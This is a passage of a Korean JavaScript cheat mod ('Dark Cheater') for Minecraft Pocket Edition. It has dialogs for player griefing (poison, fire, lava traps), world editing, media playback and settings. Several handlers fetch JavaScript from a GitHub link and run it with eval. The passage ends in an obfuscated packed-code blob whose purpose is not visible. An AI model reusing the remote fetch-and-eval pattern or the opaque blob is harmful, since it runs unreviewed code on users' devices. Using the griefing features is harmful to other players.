for(var n in types){
checks[n] = new android.widget.CheckBox(ctx);
checks[n].setText(types[n]);
checks[n].setId(n);
checks[n].setTextColor(white);
checks[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(check, onoff){
fucks[check.getId()] = onoff;
}
}));
layout.addView(checks[n]);
}
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("플레이어 조지기");
dialog.setNegativeButton("닫기", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
if(arr==null){
var pos = [Entity.getX(playerTarget), Entity.getY(playerTarget), Entity.getZ(playerTarget)];
if(fucks[0]) Entity.addEffect(playerTarget, MobEffect.poison, 600, 2, true, false);
if(fucks[1]) Entity.addEffect(playerTarget, MobEffect.confusion, 600, 2, true, false);
if(fucks[2]) Entity.addEffect(playerTarget, MobEffect.movementSlowdown, 600, 2, true, false);
if(fucks[3]) Entity.setHealth(playerTarget, 1);
if(fucks[4]) Entity.setFireTicks(playerTarget, 600);
if(fucks[5]) setTiles(pos[0]-1, pos[0]+1, pos[1]-1, pos[1]-1, pos[2]-1, pos[2]+1, 30);
if(fucks[6]) setTiles(pos[0]-1, pos[0]+1, pos[1]+4, pos[1]+6, pos[2]-1, pos[2]+1, 12);
if(fucks[7]) Entity.addEffect(playerTarget, MobEffect.blindness, 600, 2, true, false);
if(fucks[8]) teleport(playerTarget, pos[0], pos[1]+15, pos[2]);
if(fucks[9]) Level.spawnMob(pos[0], pos[1], pos[2], 93);
Dark.toast(Player.getName(playerTarget)+"(을)를 조집니다.");
if(pca) darkMessage(Player.getName(playerTarget)+"(을)를 조집니다.", true);
}
else{
for each(var pp in arr){
var pos = [Entity.getX(pp), Entity.getY(pp), Entity.getZ(pp)];
if(fucks[0]) Entity.addEffect(pp, MobEffect.poison, 600, 2, true, false);
if(fucks[1]) Entity.addEffect(pp, MobEffect.confusion, 600, 2, true, false);
if(fucks[2]) Entity.addEffect(pp, MobEffect.movementSlowdown, 600, 2, true, false);
if(fucks[3]) Entity.setHealth(pp, 1);
if(fucks[4]) Entity.setFireTicks(pp, 600);
if(fucks[5]) setTiles(pos[0]-1, pos[0]+1, pos[1]-1, pos[1]-1, pos[2]-1, pos[2]+1, 30);
if(fucks[6]) setTiles(pos[0]-1, pos[0]+1, pos[1]+4, pos[1]+6, pos[2]-1, pos[2]+1, 12);
if(fucks[7]) Entity.addEffect(pp, MobEffect.blindness, 600, 2, true, false);
if(fucks[8]) teleport(pp, pos[0], pos[1]+15, pos[2]);
if(fucks[9]) Level.spawnMob(pos[0], pos[1], pos[2], 93);
}
Dark.toast("플레이어들을 조집니다.");
}
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function selectMusic(path, btn){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var dir = new java.io.File(path).list();
var dir2 = fixArray(dir, path, false);
dialog.setItems(dir2, new android.content.DialogInterface.OnClickListener({
onClick : function(m, w){
var dir3 = new java.io.File(path+"/"+dir2[w]);
if(dir3.isDirectory()){
selectMusic(dir3, btn);
}
else{
playMusic(dir3);
btn.setText("음악 정지");
}
}
}));
dialog.setTitle("파일 선택");
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function fixArray(arr, path, tf){
var arr1 = [];
var arr2 = [];
var arr3 = [];
for each(var ff in arr){
if(ff.substring(0, 1)!=".")
arr1.push(ff);
}
for each(var ff in arr1){
var fff = new java.io.File(path+"/"+ff);
var ffff = ff.split("\\.");
var fffff = ffff[ffff.length-1];
if(fff.isDirectory())
arr2.push(ff);
if((!tf&&fffff=="mp3")||tf&&((fffff=="mp4"||fffff=="wmv"||fffff=="avi"||fffff=="mkv"||fffff=="k3g"||fffff=="skm"||fffff=="flv")))
arr3.push(ff);
}
var arr4 = arr2.sort();
var arr5 = arr3.sort();
for each(var ff in arr5)
arr4.push(ff)
return arr4;
}


function playMusic(path){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
media.reset();
media.setDataSource(path);
media.prepare();
media.start();
music = true;
Dark.toast("Music on");
}
catch(e){
Dark.showError(e);
}
}
}));
}


function selectVideo(path){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var dir = new java.io.File(path).list();
var dir2 = fixArray(dir, path, true);
dialog.setItems(dir2, new android.content.DialogInterface.OnClickListener({
onClick : function(m, w){
var dir3 = new java.io.File(path+"/"+dir2[w]);
if(dir3.isDirectory()) selectVideo(dir3);
else videoDialog(dir3);
}
}));
dialog.setTitle("파일 선택");
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function videoDialog(path){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try {
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(center);
var video = new android.widget.VideoView(ctx);
video.setVideoPath(path);
video.start();
layout.addView(video);
dialog.setView(layout);
dialog.setTitle("영상 재생");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function selectTheme(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var theme = ["기존의 테마", "DEVICE DEFAULT", "DEVICE DEFAULT LIGHT", "HOLO", "HOLO LIGHT", "THEME"];
dialog.setItems(theme, new android.content.DialogInterface.OnClickListener({
onClick : function(m, w){
Dark.save("theme", w);
Dark.toast("블록런처를 다시 시작해야 적용됩니다.");
}
}));
dialog.setTitle("블록런처 UI 테마 선택");
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function setMinecraftTheme(){
switch(Number(Dark.read("theme"))){
case 1 : 
ctx.setTheme(android.R.style.Theme_DeviceDefault_NoActionBar_Fullscreen);
break;
case 2 : 
ctx.setTheme(android.R.style.Theme_DeviceDefault_Light_NoActionBar_Fullscreen);
break;
case 3 : 
ctx.setTheme(android.R.style.Theme_Holo_NoActionBar_Fullscreen);
break;
case 4 : 
ctx.setTheme(android.R.style.Theme_Holo_Light_NoActionBar_Fullscreen);
break;
case 5 : 
ctx.setTheme(android.R.style.Theme_NoTitleBar_Fullscreen);
break;
}

}


function setLoc(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var widgets = ["스크린샷 버튼", "플레이어 좌표", "시계", "R/W & Zoom", "월드 에딧 버튼", "마인크래프트 시계", "시야 조절", "위치 초기화"];
dialog.setItems(widgets, new android.content.DialogInterface.OnClickListener({
onClick : function(m, w){
if(w==7){
removeWidgetData();
Dark.toast("초기화 되었습니다.");
}
else{
selectWidgetPosition(w);
Dark.toast("화면을 터치하여 주세요.");
}
}
}));
dialog.setTitle("위젯 위치 변경");
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function selectWidgetPosition(n){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
if(n==3){
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var dist = new android.widget.SeekBar(ctx);
dist.setMax(ctx.getWindowManager().getDefaultDisplay().getWidth()/2);
if(Dark.read("btnDist")=="") dist.setProgress(210);
else dist.setProgress(Number(Dark.read("btnDist")));
dist.setOnSeekBarChangeListener(new android.widget.SeekBar.OnSeekBarChangeListener({
onProgressChanged : function(seek){
dist2 = seek.getProgress()+"";
}
}));
layout.addView(dist);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("버튼 사이의 거리 설정");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
Dark.save("btnDist", dist2);
if(btnR!=null){
btnR.dismiss();
btnF.dismiss();
makeTwoBtn();
}
}
}));
dialog.show();
}
else{
var menu = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
layout.setOnTouchListener(new android.view.View.OnTouchListener({
onTouch : function(v, ev){
if(ev.getAction()==android.view.MotionEvent.ACTION_DOWN){
saveWidgetPosition(ev.getRawX(), ev.getRawY(), n);
menu.dismiss();
Dark.toast("수정되었습니다.");
}
return true;
}
}));
menu.setContentView(layout);
menu.setWidth(ctx.getWindowManager().getDefaultDisplay().getWidth());
menu.setHeight(ctx.getWindowManager().getDefaultDisplay().getHeight());
menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(120, 0, 0, 0)));
menu.showAtLocation(ctx.getWindow().getDecorView(), center, 0, 0);
}
}
catch(e){
Dark.showError(e);
}
}
}));
}


function saveWidgetPosition(x, y, type){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
switch(type){
case 0 : 
Dark.save("sBtnX", x);
Dark.save("sBtnY", y);
if(btnSS!=null){
btnSS.dismiss();
makeScreenShotButton();
}
break;
case 1 : 
Dark.save("playerX", x);
Dark.save("playerY", y);
if(p.p!=null){
p.p.dismiss();
Dark.showPos();
}
break;
case 2 : 
Dark.save("clockX", x);
Dark.save("clockY", y);
if(clock!=null){
clock.dismiss();
showClock(true);
}
break;
case 4 : 
Dark.save("wBtnX", x);
Dark.save("wBtnY", y);
if(w.btn!=null){
w.btn.dismiss();
makeBtnW(true);
}
break;
case 5 : 
Dark.save("mClockX", x);
Dark.save("mClockY", y);
if(clock2!=null){
clock2.dismiss();
makeMinecraftClock(true);
}
break;
case 6 : 
Dark.save("mFovX", x);
Dark.save("mFovY", y);
if(fovM!=null){
fovM.dismiss();
makeFovEditor(true);
}
break;
}
}
catch(e){
Dark.showError(e);
}
}
}));
}


function removeWidgetData(){
try{
var file = [];
var names = ["sBtnX", "sBtnY", "playerX", "playerY", "clockX", "clockY", "btnDist", "wBtnX", "sBtnY", "mClockX", "mClockY", "mFovX", "mFovY"];
for(var n=0;n<names.length;n++){
file[n] = new java.io.File(sdcard+"/darkTornado/darkCheater/"+names[n]+".txt");
if(file[n].exists()) file[n].delete();
}
if(btnSS!=null){
btnSS.dismiss();
makeScreenShotButton();
}
if(p.p!=null){
p.p.dismiss();
Dark.showPos();
}
if(clock!=null){
clock.dismiss();
showClock(true);
}
if(btnR!=null){
btnR.dismiss();
btnF.dismiss();
makeTwoBtn();
}
if(w.btn!=null){
w.btn.dismiss();
makeBtnW(true);
}
if(clock2!=null){
clock2.dismiss();
makeMinecraftClock(true);
}
if(fovM!=null){
fovM.dismiss();
makeFovEditor(true);
}
}
catch(e){
Dark.showError(e);
}
}


function worldEditSettings(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var sws = [];
var menuS = ["월드 에딧", "월드 에딧 GUI", "월드 에딧 윈도우", "지점 입력 버튼 사용", "명령어 사용시 지형 백업", "명령어 사용시 아이템 이름으로 표시"];
var bools = [w.tf, Boolean(w.btn), Boolean(wWin), Boolean(pBtn), w.back, w.uin];
for(var n in menuS){
sws[n] = new android.widget.Switch(ctx);
sws[n].setText(menuS[n]);
sws[n].setId(n);
sws[n].setChecked(bools[n]);
sws[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(swit, onoff){
switch(swit.getId()){
case 0 : 
w.tf = onoff;
break;
case 1 : 
makeBtnW(onoff);
break;
case 2 : 
if(onoff){
if(worldEditCache==null){
if(checkInternet()){
Dark.toast("월드 에딧 윈도우의 정보를 불러오고 있습니다...");
new java.lang.Thread({
run : function(){
Dark.getWindowLibrary();
Dark.addFunctions();
worldEditCache = Dark.getDataFromServer(GitHubLink+"WorldEditWindow.js")+"";
java.lang.Thread.sleep(500);
eval(worldEditCache);
}
}).start();
}
else{
Dark.toast("인터넷 연결이 필요합니다.");
}
}
else{
eval(worldEditCache);
}
}
else{
if(wWin!=null){
wWin.close();
wWin = null;
}
}
break;
case 3 : 
if(onoff){
makePointButton();
}
else{
if(pBtn!=null){
pBtn.dismiss();
pBtn = null;
}
}
break;
case 4 : 
w.back = onoff;
break;
case 5 : 
w.uin = onoff;
break;
}
}
}));
layout.addView(sws[n]);
}
var btns = [];
var menus = ["명령어 목록", "도움말"];
for(var n in menus){
btns[n] = new android.widget.Button(ctx);
btns[n].setText(menus[n]);
btns[n].setId(n);
btns[n].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
switch(v.getId()){
case 0 : 
Dark.showDialog("월드 에딧 명령어 목록", "\/set n m - 블록 아이디가 n, 블록 데미지가 m인 블록으로 채운다.\n\/replace n m - n번 블록을 m번 블록으로 바꾼다.\n\/change a b c d - 블록 아이디가 a, 블록 데미지가 b인 블록을 블록 아이디가 c, 블록 데미지가 d인 블록으로 바꾼다.\n\/no tree - 나무(나무 원목&나뭇잎)를 지운다.\n\/snow - 눈을 내린다.\n\/freeze - 액체들을 얼린다+눈.\n\/pillar n - 블록 설치시 n칸 만큼 위로 해당 블록이 쌓임. \/pillar off로 비활성화.\n\/no water - 물을 지운다.\n\/wall n m - 지점 1에 블록 아이디가 n, 블록 데미지가 m인 블록으로 속이 빈 벽을 생성한다.\n\/wall2 n m - 지점 1에 블록 아이디가 n, 블록 데미지가 m인 블록으로 벽을 생성한다. 벽 내부의 지형은 유지된다.\n\/copy - 해당 범위를 복사한다.\n\/paste에서 - \/copy에서 복사한 부분을 붙여넣는다. 지점 1(철칼로 터치한 곳)을 기준으로 x, y, z축의 양의 방향으로 붙여넣는다.\n\/back - 가장 최근에 실행했던 명령어(\/pillar는 미지원)를 되돌린다.\n\/circle r n m - 지점 1에 반지름이 r인 원을 블록 아이디 n, 블록 데미지 m인 블록으로 생성한다.\n\/circle2 r n m - 지점 1에 반지름이 r이고 내부가 채워진 원을 블록 아이디 n, 블록 데미지 m인 블록으로 생성한다.\n\/cylin r h n m - 지점 1에 반지름이 r, 높이가 h인 원기둥을 블록 아이디 n, 블록 데미지 m인 블록으로 생성한다.\n\/sphere r n m - 지점 1에 반지름이 r인 구를 블록 아이디 n, 블록 데미지 m인 블록으로 생성한다.\n\/sphereh r n m - 지점 1에 반지름이 r인 반구를 블록 아이디 n, 블록 데미지 m인 블록으로 생성한다.\n\/sphere2 r n m - 지점 1에 반지름이 r이고 내부가 채워진 구를 블록 아이디 n, 블록 데미지 m인 블록으로 생성한다.\n\/line s n m - 플레이어의 위치를 기준으로 바라보는 방향으로 s칸 앞까지의 직선을 블록 아이디 n, 블록 데미지 m인 블록으로 생성한다(상/하 미포함).\n\/line2 s n m - 플레이어의 위치를 기준으로 바라보는 방향으로 s칸 앞까지의 직선을 블록 아이디 n, 블록 데미지 m인 블록으로 생성한다(상/하 포함).\n\/unreplace n m - n번 블록을 제외한 나머지 블록들을 m번 블록으로 바꾼다.\n\/unchange a b c d - 블록 아이디가 a, 블록 데미지가 b인 블록을 제외한 나머지 블록들을 블록 아이디가 c, 블록 데미지가 d인 블록으로 바꾼다.\n");
break;
case 1 : 
Dark.showDialog("월드 에딧 도움말", "\"지형 수정\"과 \"월드 에딧\"은 별개의 기능입니다.\n\n지점 1, 2는 각각 철칼과 철괭이로 터치하거나, \"지점 입력 버튼\"을 사용하여허 선택할 수 있습니다\n\"월드 에딧 GUI\"에 있는 대칭 기능은 \/copy로 복사한 내용을 대칭시키는 것입니다. 즉, 순서는 복사 => 대칭 => 붙여넣기.\n");
break;
}
}
});
layout.addView(btns[n]);
}
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout),
dialog.setView(scroll);
dialog.setTitle("월드 에딧 설정");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function worldEditManager(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var sws = [];
var menuS = ["서버원용 월드 에딧 활성화", "명령어 사용 알림", "GUI 생성"];
var bools = [wo.tf, wo.alert, we.tf];
for(var n in menus){
sws[n] = new android.widget.Switch(ctx);
sws[n].setText(menuS[n]);
sws[n].setChecked(bools[n]);
sws[n].setId(n);
sws[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(swit, onoff){
switch(swit.getId()){
case 0 : 
wo.tf = onoff;
break;
case 1 : 
wo.alert = onoff;
break;
case 2 : 
if(Dark.read("cwepLink")=="true"){
we.tf = onoff;
Dark.save("cwep", onoff);
}
else{
Dark.toast("스크립트가 연동되어 있지 않습니다.");
}
break;
}
}
}));
layout.addView(sws[n]);
}
var btns = [];
var menus = ["사용자 목록", "명령어 사용 내역", "도움말"];
for(var n in menus){
btns[n] = new android.widget.Button(ctx);
btns[n].setText(menus[n]);
btns[n].setId(n);
btns[n].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
switch(v.getId()){
case 0 : 
showWEUser();
break;
case 1 : 
Dark.showDialog("명령어 사용 내역", worldEditString);
break;
case 2 : 
Dark.showDialog("서버원용 월드 에딧 도움말", "서버원용 월드에딧입니다. 기존의 월드 에딧과는 별개로 작동합니다.\n지점 1, 2는 각각 철칼과 철괭이로 터치하시면 선택됩니다.\n\"사용자 목록\" 버튼을 누르면 뜨는 목록에서 체크된 사람만 사용이 가능하며, OP와는 별개입니다.\n\"명령어 사용 알림\"을 키면, 서버원이 명령어를 사용할 시, 서버장에게 알림이 뜹니다.\n\n<명령어 목록>\n.set n m - 블록 아이디가 n, 블록 데미지가 m인 블록으로 채운다.\n.replace n m - n번 블록을 m번 블록으로 바꾼다.\n.change a b c d - 블록 아이디가 a, 블록 데미지가 b인 블록을 블록 아이디가 c, 블록 데미지가 d인 블록으로 바꾼다.\n.no tree - 나무(나무 원목&나뭇잎)를 지운다.\n.snow - 눈을 내린다.\n.no water - 물을 지운다.\n.circle r n m - 지점 1에 반지름이 r인 원을 블록 아이디 n, 블록 데미지 m인 블록으로 생성한다.\n.cylin r h n m - 지점 1에 반지름이 r, 높이가 h인 원기둥을 블록 아이디 n, 블록 데미지 m인 블록으로 생성한다.\n.sphere r n m - 지점 1에 반지름이 r인 구를 블록 아이디 n, 블록 데미지 m인 블록으로 생성한다.\n.line s n m - 플레이어의 위치를 기준으로 바라보는 방향으로 s칸 앞까지의 직선을 블록 아이디 n, 블록 데미지 m인 블록으로 생성한다(상/하 미포함).");
break;
}
}
});
layout.addView(btns[n]);
}
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout),
dialog.setView(scroll);
dialog.setTitle("서버원용 월드 에딧");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function showWEUser(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var playerNames = [];
for each(var e in Entity.getAll()){
if(Player.isPlayer(e))
playerNames.push(Player.getName(e));
}
if(antiTwo){
var players2 = removeDouble(playerNames);
playerNames = players2;
}
if(playerSort){
players.sort();
}
var checks = [];
for(var n in playerNames){
checks[n] = new android.widget.CheckBox(ctx);
checks[n].setText(playerNames[n]);
checks[n].setId(n);
checks[n].setTextColor(white);
if(wo.user.indexOf(playerNames[n])!=-1) checks[n].setChecked(true);
else checks[n].setChecked(false);
checks[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(check, onoff){
if(onoff==true){
wo.user.push(playerNames[check.getId()]);
}
else if(onoff==false){
wo.user.splice(wo.user.indexOf(playerNames[check.getId()]), 1);
}
}
}));
layout.addView(checks[n]);
}
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout),
dialog.setView(scroll);
dialog.setTitle("서버원용 월드 에딧 - 사용자 목록");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function showChatLog(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
dialog.setTitle("대화 내용 보기");
dialog.setMessage(chatLog);
dialog.setNegativeButton("닫기", null);
dialog.setPositiveButton("SD 카드에 저장", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
selectDir(sdcard);
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function selectDir(path, nn){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var dir = new java.io.File(path).list().sort();
var dir2 = [];
for each(var ff in dir){
var fff = new java.io.File(path+"/"+ff);
if(ff.substring(0, 1)!="."&&fff.isDirectory())
dir2.push(ff);
}
dialog.setItems(dir2, new android.content.DialogInterface.OnClickListener({
onClick : function(m, w){
var dir3 = new java.io.File(path+"/"+dir2[w]);
selectDir(dir3, nn);
}
}));
dialog.setTitle("폴더 선택");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("저장", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
if(nn==1) exportChatLog(path+"/terrorLog-"+Level.getWorldName()+".txt", 1);
else if(nn==2) exportChatLog(path+"/setTile Manager.txt", 2);
else if(nn==3) exportChatLog(path+"/Particle Helper.txt", 3);
else exportChatLog(path+"/chatLog-"+Level.getWorldName()+".txt");
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function exportChatLog(path, nn){
try{
var file = new java.io.File(path);
var fos = new java.io.FileOutputStream(file);
if(nn==1) var str = new java.lang.String(terrorLog);
else if(nn==2) var str = new java.lang.String(setTileString);
else if(nn==3) var str = new java.lang.String(particleString);
else var str = new java.lang.String(chatLog);
fos.write(str.getBytes());
fos.close();
Dark.toast("저장되었습니다.\n("+path+")");
}
catch(e){
Dark.showError(e);
}
}


function showTerrorLog(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
dialog.setTitle("테러 기록 보기");
dialog.setMessage(terrorLog);
dialog.setNegativeButton("닫기", null);
dialog.setPositiveButton("SD 카드에 저장", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
selectDir(sdcard, 1);
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function removeDouble(arr){
var arr1 = [];
for(var n=0;n<arr.length;n++){
if(arr1.indexOf(arr[n])==-1) arr1.push(arr[n]);
}
return arr1;
}


function darkCheaterSetting(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
menuS = new android.widget.PopupWindow();
var title = makeTitle("환경 설정", menuS);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var btnT = [];
var menuT = ["Dark 버튼 숨기기", "플레이어 목록에서 중복되는 이름 삭제", "플레이어 목록 가나다순으로 정렬", "어플 목록에서 패키지명도 표시", "X-Ray에서 광물 탐색", "드래그로 위젯&버튼 위치 수정", "표지판 tp 사용 알림", "modTick 강제 호출", "서버 접속시 버튼 재생성", "일부 테러 방지 기능 자동 활성화", "네이티브 센드챗 부활", "이벤트 리스너로 서버원 감지", "키보드 전체화면 off", "쇼 팁 메시지 픽스"];
var bools = [btnHide, antiTwo, playerSort, appPack, scanOre, widgetDrag, tpAlert, modTickOnoff, btnRe, eval(Dark.read("antiTerror")+""), fixSendChat, getPlayers, noFull, stmf.fix];
for(var n in menuT){
btnT[n] = new DarkToggleButton(ctx);
btnT[n].setText(menuT[n]);
btnT[n].setId(n);
btnT[n].setChecked(Boolean(bools[n]));
btnT[n].setOnChangedListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
switch(toggle.getId()){
case 0 : 
btnHide = onoff;
btn.dismiss();
Dark.makeButton();
break;
case 1 : 
antiTwo = onoff;
break;
case 2 : 
playerSort = onoff;
break;
case 3 : 
appPack = onoff;
break;
case 4 : 
scanOre = onoff;
break;
case 5 : 
widgetDrag = onoff;
if(onoff) Dark.toast("블록런처 종료시, 초기화됩니다.");
break;
case 6 : 
tpAlert = onoff;
break;
case 7 : 
modTickOnoff = onoff;
if(onoff) callModTick();
break;
case 8 : 
btnRe = onoff;
break;
case 9 : 
Dark.save("antiTerror", onoff);
break;
case 10 : 
fixSendChat = onoff;
break;
case 11 : 
getPlayers = onoff;
Dark.read("eacf", onoff);
break;
case 12 : 
noFull = onoff;
break;
case 13 : 
stmf.fix = onoff;
if(onoff) Fix.makeMessageWindow();
else Fix.removeMessageWindow();
break;
}
}
}));
layout.addView(btnT[n].mv());
}
var btns = [];
var menus = ["UI 설정", "웹 브라우저 설정", "버튼 위치 수정", "메뉴 위치 수정", "위젯 위치 수정", "추가 파일 다운로드", "지도 범위 설정", "이용 약관 보기", "디바이스 정보", "서버에서 버튼 유지", "Nusty 설정", "공지 사항 게시판", "DCMS 관리", "Dark Cheater Addon", "로그인/회원가입", "Deep Dark Cheater"];
for(var n in menus){
btns[n] = makeButton(menus[n]);
btns[n].setId(n);
btns[n].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
switch(v.getId()){
case 0 : 
Dark.close(false);
designSettings();
break;
case 1 : 
webViewSetting();
break;
case 2 : 
buttonLocation();
break;
case 3 : 
if(side==0){
side = 1;
Dark.toast("왼쪽으로 설정되었습니다.");
}
else if(side==1){
side = 0;
Dark.toast("오른쪽으로 설정되었습니다.");
}
Dark.save("side", side);
Dark.close(true);
if(menuJ!=null){
menuJ.dismiss();
menuJ = null;
openFlying();
}
break;
case 4 : 
setLoc();
break;
case 5 : 
selectAddOn();
break;
case 6 : 
inputText(2);
break;
case 7 : 
new java.lang.Thread({
run : function(){
var str = Dark.getDataFromServer(GitHubLink+"darkCheaterTerms.txt").split(">\n\n\n");
Dark.showDialog("Dark Cheater 이용 약관", str[1]);
}
}).start();
break;
case 8 : 
Dark.showDialog("디바이스 정보", "기종 : "+android.os.Build.MODEL+"\n안드로이드 버전 : "+android.os.Build.VERSION.RELEASE+"\nAPI 버전 : "+android.os.Build.VERSION.SDK_INT+"\n베터리 잔량 : "+Dark.getBatteryLevel()+"\n베터리 온도 : "+Dark.getBatteryTemp());
break;
case 9 : 
buttonRevival();
break;
case 10 : 
Dark.save("nusty", true);
break;
case 11 : 
if(checkInternet()){
Dark.toast("공지사항을 읽어오고 있습니다...");
new java.lang.Thread({
run : function(){
openNotice(Dark.getDataFromServer(GitHubLink+"notice.txt").toString());
}
}).start();
}
else{
Dark.toast("인터넷 연결을 확인하여주세요");
}
break;
case 12 : 
try{
DCMS.openManager();
}
catch(e){
Dark.downloadCompiler();
}
break;
case 13 : 
new java.lang.Thread({
run : function(){
Dark.addonList(Dark.getDataFromServer(GitHubLink+"DarkCheaterAddon.txt"));
}
}).start();
break;
case 14 : 
Dark.memberSet();
break;
case 15 : 
if(checkInternet()){
var code = function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('C b="\\q\\k\\d\\g\\p\\G\\h\\g\\n\\d\\k\\h\\q\\k\\d\\g\\p\\v\\l\\a\\d\\c\\a\\g\\q\\s\\d\\g\\p\\v\\l\\a\\d\\c\\a\\g\\t\\M\\r\\m\\f\\i\\h\\f\\a\\T\\i\\j\\c\\j\\f\\k\\d\\g\\p\\G\\h\\g\\n\\d\\k\\h\\q\\k\\d\\g\\p\\v\\l\\a\\d\\c\\a\\g\\f\\s\\d\\g\\p\\v\\l\\a\\d\\c\\a\\g\\t\\M\\r\\m\\f\\s\\a\\a\\r\\x\\s\\d\\g\\p\\x\\v\\l\\a\\d\\c\\a\\g\\f\\l\\c\\c\\r\\j\\V\\q\\q\\g\\d\\o\\t\\m\\i\\c\\l\\D\\E\\D\\j\\a\\g\\y\\h\\n\\c\\a\\n\\c\\t\\y\\h\\w\\q\\s\\d\\g\\p\\G\\h\\g\\n\\d\\k\\h\\q\\k\\d\\g\\p\\v\\l\\a\\d\\c\\a\\g\\q\\w\\d\\j\\c\\a\\g\\q\\k\\d\\g\\p\\v\\l\\a\\d\\c\\a\\g\\t\\M\\r\\m\\f\\1N\\2b\\x\\J\\2k\\1s\\1C\\1D\\x\\1G\\1H\\1J\\x\\J\\W\\x\\1P\\1R\\1U\\X\\Z\\1d\\t\\f\\j\\l\\h\\o\\s\\i\\d\\u\\h\\m\\f\\1x\\W\\x\\1y\\J\\1z\\X\\Z\\1d\\t\\t\\t\\f\\c\\h\\d\\j\\c\\f\\o\\i\\k\\m\\a\\c\\f\\j\\a\\c\\1A\\g\\i\\a\\n\\c\\d\\c\\i\\h\\n\\f\\k\\a\\y\\h\\k\\a\\S\\i\\u\\a\\f\\